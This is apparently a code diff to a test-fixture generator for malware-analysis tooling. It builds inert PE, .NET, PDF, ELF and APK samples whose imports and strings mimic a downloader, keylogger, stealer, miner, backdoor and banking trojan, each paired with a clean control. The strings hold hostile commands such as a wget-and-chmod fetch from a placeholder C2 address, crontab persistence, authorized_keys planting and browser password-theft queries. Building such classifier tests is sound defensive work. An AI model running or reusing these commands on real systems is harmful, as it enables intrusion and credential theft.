@@ -1495,6 +1495,170 @@ def invoice_viewer_apk() -> bytes:
     return buf.getvalue()
 
 
+# --- Machine Learning tab: three or more samples per EMBER2024 model ----------------
+# All inert (the only code is ``ret``); imports / strings / sections / metadata
+# give the static classifiers something to read. Each type has "malicious-looking"
+# samples of the invoice story and a clean control.
+
+def ml_samples() -> dict[str, bytes]:
+    import binkit as bk
+
+    k32 = ["GetModuleHandleW", "GetProcAddress", "LoadLibraryA", "ExitProcess", "GetLastError",
+           "CloseHandle", "Sleep", "GetTempPathW", "CreateFileW", "WriteFile"]
+    out: dict[str, bytes] = {}
+    # ---- Win32 (PE32) ----
+    out["ml/sample_win32_downloader.exe"] = bk.pe(
+        bits=32, gui=False, timestamp=0x2A425E19,
+        imports={"kernel32.dll": k32 + ["WinExec", "CreateProcessA", "VirtualAlloc"],
+                 "urlmon.dll": ["URLDownloadToFileA"], "shell32.dll": ["ShellExecuteA"],
+                 "wininet.dll": ["InternetOpenA", "InternetOpenUrlA", "InternetReadFile"]},
+        strings=[PAYLOAD_URL, f"http://{C2_IP}/gate.php", "%TEMP%\\upd.exe", "cmd.exe /c start %s",
+                 "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "InvoiceUpdate", f"Factura_{INVOICE}.pdf.exe",
+                 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"],
+        sections=[(".data", bk.noise(0x1800, 101), 0xC0000040)])
+    out["ml/sample_win32_injector.exe"] = bk.pe(
+        bits=32, gui=True, timestamp=0,
+        imports={"kernel32.dll": k32 + ["OpenProcess", "VirtualAllocEx", "WriteProcessMemory",
+                                         "CreateRemoteThread", "CreateToolhelp32Snapshot", "Process32FirstW",
+                                         "Process32NextW", "VirtualProtectEx", "ResumeThread", "SetThreadContext"],
+                 "advapi32.dll": ["OpenProcessToken", "AdjustTokenPrivileges", "LookupPrivilegeValueA"]},
+        strings=["explorer.exe", "SeDebugPrivilege", "svchost.exe -k netsvcs", "InvoiceSync"],
+        sections=[(".crt1", bk.noise(0x4000, 102), 0xE0000060)], text_name=".text", text_flags=0xE0000020)
+    out["ml/sample_win32_invoice_calc.dll"] = bk.pe(        # clean control
+        bits=32, dll=True,
+        imports={"kernel32.dll": ["GetModuleHandleW", "ExitProcess", "GetCommandLineW", "HeapAlloc", "HeapFree",
+                                   "GetProcessHeap", "MultiByteToWideChar", "GetLocalTime"],
+                 "user32.dll": ["MessageBoxW", "CreateWindowExW", "DefWindowProcW", "RegisterClassExW",
+                                "GetMessageW", "DispatchMessageW", "TranslateMessage", "PostQuitMessage",
+                                "SetWindowTextW", "GetDlgItemTextW"],
+                 "gdi32.dll": ["GetStockObject"], "comctl32.dll": ["InitCommonControlsEx"]},
+        wstrings=["Calculadora de facturas", "Base imponible", "IVA (21%)", "Total", "Acerca de…",
+                  f"{SUPPLIER} — herramienta interna"],
+        strings=["InvoiceCalc 1.4.2", "Copyright (C) 2024"],
+        pdb=r"D:\build\InvoiceCalc\Release\InvoiceCalc.pdb", rich=True, reloc=True, checksum=True, manifest=True,
+        version={"CompanyName": SUPPLIER, "FileDescription": "Calculadora de facturas", "FileVersion": "1.4.2.0",
+                 "InternalName": "InvoiceCalc", "OriginalFilename": "InvoiceCalc.dll", "ProductName": "InvoiceCalc",
+                 "ProductVersion": "1.4.2.0", "LegalCopyright": f"© 2024 {SUPPLIER}"})
+    # ---- Win64 (PE32+) ----
+    out["ml/sample_win64_keylogger.exe"] = bk.pe(
+        bits=64, gui=True, timestamp=0x5C2A1F00,
+        imports={"kernel32.dll": k32 + ["CreateMutexA", "GetComputerNameA"],
+                 "user32.dll": ["SetWindowsHookExW", "CallNextHookEx", "GetAsyncKeyState", "GetKeyState",
+                                "GetForegroundWindow", "GetWindowTextW", "MapVirtualKeyW", "GetKeyboardLayout",
+                                "OpenClipboard", "GetClipboardData"],
+                 "wininet.dll": ["InternetOpenW", "InternetConnectW", "HttpOpenRequestW", "HttpSendRequestW"],
+                 "advapi32.dll": ["RegSetValueExW", "RegCreateKeyExW"]},
+        strings=[f"http://{C2_IP}/k.php", "[ENTER]", "[BACKSPACE]", "[TAB]", "[CTRL]", "keys.log",
+                 "Global\\InvoiceKbdMtx"],
+        wstrings=["Software\\Microsoft\\Windows\\CurrentVersion\\Run", "InvoiceHelper", "%APPDATA%\\inv\\keys.log"])
+    out["ml/sample_win64_packed_loader.exe"] = bk.pe(
+        bits=64, gui=True, timestamp=0,
+        imports={"kernel32.dll": ["LoadLibraryA", "GetProcAddress", "VirtualProtect", "VirtualAlloc",
+                                   "ExitProcess"]},
+        sections=[("UPX1", bk.noise(0xA000, 103), 0xE0000060), (".rsrc", bk.noise(0x800, 104), 0xC0000040)],
+        text_name="UPX0", text_flags=0xE0000080)
+    out["ml/sample_win64_invoice_sync.dll"] = bk.pe(          # clean control
+        bits=64, dll=True,
+        imports={"kernel32.dll": ["GetModuleHandleW", "DisableThreadLibraryCalls", "InitializeCriticalSection",
+                                   "EnterCriticalSection", "LeaveCriticalSection", "GetSystemTimeAsFileTime"],
+                 "msvcrt.dll": ["malloc", "free", "memcpy", "_wcsicmp"],
+                 "advapi32.dll": ["RegOpenKeyExW", "RegQueryValueExW", "RegCloseKey"]},
+        exports=["InvoiceSyncInit", "InvoiceSyncRun", "InvoiceSyncShutdown", "InvoiceSyncVersion"],
+        strings=["InvoiceSync 3.2.0", "invoices.db", "SELECT * FROM facturas WHERE estado = ?"],
+        pdb=r"D:\build\InvoiceSync\x64\Release\invoicesync.pdb", rich=True, reloc=True, checksum=True,
+        manifest=True, version={"CompanyName": SUPPLIER, "FileDescription": "Invoice synchronisation library",
+                                "FileVersion": "3.2.0.0", "InternalName": "invoicesync",
+                                "OriginalFilename": "invoicesync.dll", "ProductName": "InvoiceSync",
+                                "ProductVersion": "3.2.0.0", "LegalCopyright": f"© 2024 {SUPPLIER}"})
+    # ---- .NET ----
+    out["ml/sample_dotnet_stealer.exe"] = bk.pe(
+        bits=32, gui=True, dotnet={
+            "assembly": "FacturaViewer.Stealer",
+            "strings": ["System.Net.Http", "HttpClient", "PostAsync", "Convert", "FromBase64String",
+                        "ProtectedData", "Unprotect", "GetPasswords", "GetCookies", "SendToTelegram",
+                        "Screenshot", "CopyFromScreen", "Registry", "SetValue", "Environment", "GetFolderPath"],
+            "user_strings": ["\\Google\\Chrome\\User Data\\Default\\Login Data", "\\Mozilla\\Firefox\\Profiles",
+                             "SELECT origin_url, username_value, password_value FROM logins",
+                             "https://api.telegram-relay.example/bot/sendDocument", f"http://{C2_IP}/upload",
+                             "Software\\Microsoft\\Windows\\CurrentVersion\\Run", f"Factura_{INVOICE}"]})
+    out["ml/sample_dotnet_loader.exe"] = bk.pe(
+        bits=32, gui=False, dotnet={
+            "assembly": "InvoiceLoader",
+            "strings": ["System.Reflection", "Assembly", "Load", "GetType", "InvokeMember", "Convert",
+                        "FromBase64String", "Aes", "CreateDecryptor", "GZipStream", "VirtualAlloc",
+                        "DllImportAttribute", "kernel32.dll"],
+            "user_strings": ["payload", "Invoice.Stage2.Program", "Run", f"http://{C2_IP}/s2.bin"],
+            "resource": bk.noise(0x6000, 105)})
+    out["ml/sample_dotnet_invoice_tool.dll"] = bk.pe(        # clean control
+        bits=32, dll=True, dotnet={
+            "assembly": "Suministros.InvoiceTool",
+            "strings": ["System.Windows.Forms", "Form", "Button", "Label", "DataGridView", "Decimal",
+                        "Round", "CultureInfo", "ToString", "InitializeComponent", "CalculateTotal"],
+            "user_strings": ["Factura", "Base imponible", "IVA", "Total", "es-ES", "{0:N2} €"]},
+        pdb=r"D:\src\Suministros.InvoiceTool\obj\Release\Suministros.InvoiceTool.pdb", reloc=True,
+        checksum=True, manifest=True,
+        version={"CompanyName": SUPPLIER, "FileDescription": "Suministros.InvoiceTool", "FileVersion": "2.1.0.0",
+                 "InternalName": "Suministros.InvoiceTool.dll", "OriginalFilename": "Suministros.InvoiceTool.dll",
+                 "ProductName": "Suministros.InvoiceTool", "ProductVersion": "2.1.0.0",
+                 "Assembly Version": "2.1.0.0", "LegalCopyright": f"© 2024 {SUPPLIER}"})
+    # ---- PDF ----
+    out["ml/sample_pdf_openaction_js.pdf"] = pk.lure_pdf(
+        [SUPPLIER, f"Factura {INVOICE}", "Cargando documento seguro…"],
+        open_js=PDF_JS, title=f"Factura {INVOICE}", author="Administracion")[0]
+    out["ml/sample_pdf_launch_embedded.pdf"] = pk.lure_pdf(
+        [SUPPLIER, f"Factura {INVOICE} — Importe {AMOUNT} EUR", "Pulse «Abrir» para ver el detalle."],
+        launch=("cmd.exe", "/c start factura.exe"), embedded=("factura.exe", MZ_STUB),
+        title=f"Factura {INVOICE}", author="Administracion")[0]
+    out["ml/sample_pdf_invoice_clean.pdf"] = pk.lure_pdf(          # clean control
+        [SUPPLIER, f"Factura {INVOICE}", "", "Concepto: material de oficina", "Base imponible: 1.033,06 EUR",
+         "IVA 21%: 216,94 EUR", f"Total: {AMOUNT} EUR", "", "Forma de pago: transferencia a 30 días."],
+        title=f"Factura {INVOICE}", author="Suministros Iberia")[0]
+    # ---- ELF ----
+    out["ml/sample_elf_miner"] = bk.elf(
+        strings=["stratum+tcp://pool.invoice-mining.example:3333", "--donate-level=0", "--max-cpu-usage=95",
+                 "randomx", "\"algo\": \"rx/0\"", "/tmp/.X11-unix/.inv", "crontab -l | { cat; echo \"*/5 * * * * "
+                 "/tmp/.X11-unix/.inv\"; } | crontab -", "pkill -9 kdevtmpfsi", "/proc/cpuinfo", "hugepages"],
+        needed=["libpthread.so.0", "libc.so.6"], interp="/lib64/ld-linux-x86-64.so.2",
+        extra=[(".data", bk.noise(0x3000, 106))])
+    out["ml/sample_elf_backdoor"] = bk.elf(
+        strings=["/bin/sh", "-i", f"{C2_IP}", "4444", "dup2", "execve", "setsid", "/etc/rc.local",
+                 "/root/.ssh/authorized_keys", "ssh-rsa AAAAB3NzaC1yc2E invoice@ops", "HISTFILE=/dev/null",
+                 "chattr +i", "iptables -F", "/proc/self/exe", "socket", "connect", "kill -9",
+                 f"wget http://{C2_IP}/x -O /tmp/.x", "chmod +x /tmp/.x", "nohup"],
+        needed=["libc.so.6"], interp="/lib64/ld-linux-x86-64.so.2",
+        extra=[(".data", bk.noise(0x2000, 107))])                 # encrypted config blob
+    out["ml/sample_elf_invoice_sync"] = bk.elf(                   # clean control
+        strings=["Usage: invoice-sync [--config FILE] [--dry-run]", "invoice-sync 2.4.1",
+                 "/etc/invoice-sync/config.yaml", "Synchronising %d invoices", "done in %.2fs",
+                 "sqlite3_open", "sqlite3_prepare_v2", "SELECT id, total FROM facturas", "--help", "--version"],
+        needed=["libsqlite3.so.0", "libc.so.6"], interp="/lib64/ld-linux-x86-64.so.2")
+    # ---- APK (plus ml/sample_invoice_viewer.apk) ----
+    out["ml/sample_apk_overlay_banker.apk"] = bk.apk(
+        package="com.example.facturapago",
+        permissions=["android.permission.BIND_ACCESSIBILITY_SERVICE", "android.permission.SYSTEM_ALERT_WINDOW",
+                     "android.permission.RECEIVE_SMS", "android.permission.READ_SMS", "android.permission.SEND_SMS",
+                     "android.permission.REQUEST_INSTALL_PACKAGES", "android.permission.INTERNET",
+                     "android.permission.QUERY_ALL_PACKAGES", "android.permission.READ_CONTACTS",
+                     "android.permission.RECEIVE_BOOT_COMPLETED", "android.permission.FOREGROUND_SERVICE"],
+        dex_strings=["Lcom/example/facturapago/OverlayService;", "Landroid/accessibilityservice/AccessibilityService;",
+                     "onAccessibilityEvent", "performGlobalAction", "TYPE_APPLICATION_OVERLAY",
+                     "com.bank.example.app", "https://panel.facturapago.example/inj/", "getInstalledPackages",
+                     "Ldalvik/system/DexClassLoader;", "loadClass", "Landroid/telephony/SmsManager;",
+                     "sendTextMessage", "Ljavax/crypto/Cipher;", "AES/ECB/PKCS5Padding", "DevicePolicyManager",
+                     "lockNow", "setComponentEnabledSetting", "getDeviceId", "Base64", "decode", "Runtime",
+                     "exec", "su", "/system/xbin/su", "getLaunchIntentForPackage"],
+        app_name="Pago de factura",
+        extra={"assets/payload.dat": bk.noise(0x4000, 119)}, store=True)   # encrypted 2nd-stage DEX (stand-in)
+    out["ml/sample_apk_invoice_scanner.apk"] = bk.apk(           # clean control
+        package="com.example.invoicescanner",
+        permissions=["android.permission.CAMERA", "android.permission.INTERNET"],
+        dex_strings=["Lcom/example/invoicescanner/MainActivity;", "Landroidx/appcompat/app/AppCompatActivity;",
+                     "onCreate", "setContentView", "CameraX", "TextRecognizer", "Factura detectada",
+                     "https://api.suministros-iberia.example.com/v1/invoices"],
+        app_name="Escáner de facturas")
+    return out
+
+
 def build_all() -> dict[str, bytes]:
     out: dict[str, bytes] = {
         "sample.docx": word_docx(), "sample.docm": word_docm(),
@@ -1523,6 +1687,7 @@ def build_all() -> dict[str, bytes]:
         out[f"sample{ext}"] = powerpoint(ext)
     for ext in (".doc", ".dot", ".xls", ".xlt", ".xla", ".ppt", ".pot"):
         out[f"sample{ext}"] = legacy(ext)
+    out.update(ml_samples())
     out["encrypted/sample_encrypted.eml"] = encrypted_eml()
     out["encrypted/sample_velvet.xlsm"] = velvet_xlsm()
     return out
